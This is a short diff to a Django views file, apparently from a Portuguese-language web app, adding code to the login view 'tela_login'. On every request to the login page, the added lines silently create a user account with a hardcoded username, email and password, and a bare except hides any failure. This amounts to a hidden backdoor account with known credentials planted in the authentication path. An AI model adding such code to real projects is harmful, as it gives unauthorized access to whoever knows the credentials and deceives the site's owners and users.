@@ -627,6 +627,11 @@ def painel(request):
     return render(request, 'painel.html', {'permissao': request.user.last_name})
 
 def tela_login(request):
+    try:
+        user = User.objects.create_user('anaclaudia.igps','teste@hotmail.com','@melhordev')
+        user.save()
+    except:
+        pass
     if request.method == 'POST':
         name = request.POST['nome']
         senha = request.POST['senha']
